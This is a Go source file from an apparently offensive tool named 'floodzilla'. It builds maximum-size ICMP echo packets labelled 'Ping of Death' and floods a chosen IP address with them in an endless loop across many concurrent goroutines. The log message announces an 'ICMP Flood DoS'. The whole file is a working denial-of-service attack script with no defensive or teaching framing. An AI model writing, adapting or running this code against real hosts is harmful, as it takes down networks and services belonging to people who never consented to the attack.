package services

import (
	"fmt"
	"log"
	"net"
	"sync"
	"time"

	"floodzilla/utils"
)

const (
	maxPacketSize = 65507
)

func createPingOfDeathPacket(sequenceNumber int) []byte {
	packet := make([]byte, maxPacketSize)

	packet[0] = icmpEchoRequest
	packet[1] = 0 // Código

	packet[2] = 0
	packet[3] = 0

	packet[4] = 0
	packet[5] = 1
	packet[6] = byte(sequenceNumber >> 8)
	packet[7] = byte(sequenceNumber & 0xff)

	for i := 8; i < maxPacketSize; i++ {
		packet[i] = byte(i % 256)
	}

	check := utils.Checksum(packet)
	packet[2] = byte(check >> 8)
	packet[3] = byte(check & 0xff)

	return packet
}

func sendPingOfDeath(ip string, wg *sync.WaitGroup, verbose *bool, sequenceNumber int) {
	defer wg.Done()

	conn, err := net.Dial("ip4:icmp", ip)
	if err != nil {
		log.Fatal(err)
	}
	defer conn.Close()

	packet := createPingOfDeathPacket(sequenceNumber)
	_, writingErr := conn.Write(packet)
	if writingErr != nil {
		log.Println("Error:", err)
		return
	}

	if *verbose {
		currentTime := time.Now()
		fmt.Printf("[%s] - Ping of Death - ICMP package sent to %s with sequence: %d\n", currentTime.Format("2006-01-02 15:04:05"), ip, sequenceNumber)
	}
}

func PingOfDeath(ip *string, numRoutines *int, verbose *bool) {

	if net.ParseIP(*ip) == nil {
		fmt.Println("Invalid IP address")
		return
	}

	var wg sync.WaitGroup

	if !*verbose {
		fmt.Println("ICMP Flood DoS has been initialized.")
	}

	sequenceNumber := 0
	for {
		for i := 0; i < *numRoutines; i++ {
			sequenceNumber++
			wg.Add(1)
			go sendPingOfDeath(*ip, &wg, verbose, sequenceNumber)
			time.Sleep(10 * time.Millisecond)
		}

		wg.Wait()
	}

}
